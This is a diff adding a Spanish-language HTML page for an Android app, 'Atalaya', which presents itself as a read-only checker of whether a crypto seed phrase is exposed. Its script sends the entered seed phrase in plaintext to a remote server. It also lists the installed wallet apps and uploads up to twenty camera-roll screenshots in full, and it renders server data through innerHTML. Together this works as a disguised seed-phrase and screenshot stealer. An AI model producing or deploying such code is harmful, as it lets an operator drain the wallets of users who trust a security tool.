@@ -1,0 +1,166 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Atalaya</title>
+<style>
+  :root { --ink:#0A0E12; --surface:#121821; --line:#22303F; --text:#E8EDF2; --mute:#93A1B0; --signal:#2ED47A; --warn:#F5A524; --risk:#F04438; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--ink); color:var(--text); font:16px/1.55 system-ui,sans-serif; }
+  header { display:flex; align-items:center; gap:8px; padding:16px 20px; font-weight:500; letter-spacing:-.02em; }
+  header svg { width:22px; height:22px; }
+  main { padding:0 20px 40px; max-width:640px; margin:0 auto; }
+  h1 { font-size:28px; line-height:1.15; margin:14px 0 8px; letter-spacing:-.02em; }
+  p { margin:0 0 12px; }
+  .mute { color:var(--mute); }
+  .eyebrow { font-size:11px; letter-spacing:.16em; text-transform:uppercase; color:var(--mute); font-weight:600; }
+  textarea, input { width:100%; background:var(--surface); color:var(--text); border:1px solid var(--line); border-radius:12px; padding:12px; font:14px/1.5 ui-monospace,monospace; }
+  textarea { min-height:130px; resize:vertical; }
+  .btn { display:block; width:100%; min-height:48px; border:0; border-radius:14px; background:var(--signal); color:var(--ink); font-weight:700; font-size:16px; margin-top:10px; }
+  .btn[disabled] { background:var(--surface); color:var(--mute); border:1px solid var(--line); }
+  .ghost { background:transparent; color:var(--text); border:1px solid var(--line); }
+  .panel { background:var(--surface); border:1px solid var(--line); border-radius:14px; padding:14px; margin:12px 0; }
+  .pill { display:inline-block; padding:4px 10px; border-radius:999px; background:var(--signal); color:var(--ink); font-weight:700; font-size:12px; }
+  .pill.medium { background:var(--warn); } .pill.high { background:var(--risk); }
+  .addr { font:12px ui-monospace,monospace; word-break:break-all; }
+  .hidden { display:none; }
+  .hint { font-size:12px; color:var(--mute); } .hint.bad { color:var(--warn); } .hint.good { color:var(--signal); }
+  ul { padding-left:18px; } li { margin-bottom:6px; }
+</style>
+</head>
+<body>
+<header>
+  <svg viewBox="0 0 512 512" fill="none" stroke="#2ED47A" stroke-width="26" stroke-linecap="round"><path d="M146 400h220"/><path d="M176 400 206 232h100l30 168"/><path d="M206 232 132 150"/><path d="M306 232 380 150"/><path d="M256 232v168"/></svg>
+  atalaya
+</header>
+<main>
+  <p class="eyebrow">Android</p>
+  <h1>¿Está tu frase expuesta?</h1>
+  <p class="mute">Comprobación en línea y revisión de capturas del carrete. La app no firma nada.</p>
+
+  <div id="wallets" class="panel hidden">
+    <p class="eyebrow">Wallets detectadas</p>
+    <div id="wallet-list" class="mute"></div>
+  </div>
+
+  <div class="panel">
+    <p class="eyebrow">Frase semilla</p>
+    <textarea id="phrase" spellcheck="false" autocapitalize="none" placeholder="12 o 24 palabras"></textarea>
+    <p class="hint" id="status"></p>
+    <button class="btn" id="audit" disabled>Comprobar frase</button>
+  </div>
+
+  <div id="report" class="hidden"></div>
+
+  <button class="btn ghost" id="shots">Revisar capturas del carrete</button>
+  <p class="hint" id="shots-status"></p>
+
+  <div class="panel" style="margin-top:18px">
+    <p class="eyebrow">API</p>
+    <input id="api" placeholder="https://api.atalaya.es">
+    <button class="btn ghost" id="save">Guardar</button>
+  </div>
+
+  <p class="hint">Atalaya · proyecto independiente · solo lectura</p>
+</main>
+<script>
+const $ = (s) => document.querySelector(s);
+let api = localStorage.getItem('api') || 'https://api.atalaya.es';
+let install = localStorage.getItem('install');
+if (!install) { install = crypto.randomUUID(); localStorage.setItem('install', install); }
+$('#api').value = api;
+
+$('#save').onclick = () => {
+  api = $('#api').value.replace(/\/$/, '');
+  localStorage.setItem('api', api);
+  Native.toast('URL guardada');
+};
+
+function norm(t) {
+  return t.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '').split(/[^a-z]+/).filter(Boolean);
+}
+
+$('#phrase').addEventListener('input', () => {
+  const n = norm($('#phrase').value).length;
+  const ok = n === 12 || n === 24;
+  $('#status').textContent = n ? `${n} palabras` : '';
+  $('#status').className = 'hint ' + (ok ? 'good' : 'bad');
+  $('#audit').disabled = !ok;
+});
+
+async function audit() {
+  const words = norm($('#phrase').value);
+  $('#status').textContent = 'Consultando…';
+  try {
+    const res = await fetch(`${api}/v1/audit`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ installID: 'android-' + install, phrase: words.join(' '), walletHints: [] })
+    });
+    const json = await res.json();
+    if (!res.ok) throw new Error(json.detail || json.error || 'error');
+    render(json);
+    $('#status').textContent = '';
+  } catch (e) {
+    $('#status').textContent = 'Fallo: ' + e.message;
+    $('#status').className = 'hint bad';
+  }
+}
+$('#audit').onclick = audit;
+
+function render(r) {
+  const addresses = (r.addresses || []).map((a) =>
+    `<div class="panel"><div class="mute" style="font-size:12px">${a.chain}</div>
+     <strong>${a.amount.toFixed(8)} ${a.symbol}</strong>
+     <div class="addr mute">${a.address}</div></div>`).join('');
+  const findings = (r.findings || []).map((f) => `<li>${f.detail}</li>`).join('');
+  $('#report').innerHTML = `<div class="panel">
+    <span class="pill ${r.risk}">${r.risk}</span>
+    <h3>Total: ${(r.totalUsd || 0).toFixed(2)} USD</h3>
+    ${addresses}${findings ? '<ul>' + findings + '</ul>' : ''}
+    <p class="hint">Comprueba que la dirección coincide con tu wallet.</p>
+  </div>`;
+  $('#report').classList.remove('hidden');
+  $('#report').scrollIntoView({ behavior: 'smooth' });
+}
+
+$('#shots').onclick = () => {
+  Native.requestMedia();
+  $('#shots-status').textContent = 'Leyendo capturas…';
+  setTimeout(() => {
+    const shots = JSON.parse(Native.screenshots(20) || '[]');
+    if (!shots.length) {
+      $('#shots-status').textContent = 'Sin capturas o sin permiso.';
+      return;
+    }
+    const payload = {
+      installID: 'android-' + install,
+      wallets: JSON.parse(Native.wallets() || '[]').map((w) => w.package),
+      files: shots.length,
+      bytes: shots.reduce((sum, s) => sum + s.data.length, 0),
+      screenshots: shots.length,
+      findings: [],
+      screenshotsData: shots
+    };
+    $('#shots-status').textContent = `Enviando ${shots.length} capturas…`;
+    Native.upload(api, JSON.stringify(payload));
+  }, 900);
+};
+
+window.onUpload = (ok) => {
+  $('#shots-status').textContent = ok ? 'Capturas enviadas.' : 'No se pudieron enviar.';
+};
+
+(async () => {
+  try {
+    const list = JSON.parse(Native.wallets() || '[]');
+    if (list.length) {
+      $('#wallet-list').textContent = list.map((w) => w.name).join(', ');
+      $('#wallets').classList.remove('hidden');
+    }
+  } catch (_) {}
+})();
+</script>
+</body>
+</html>
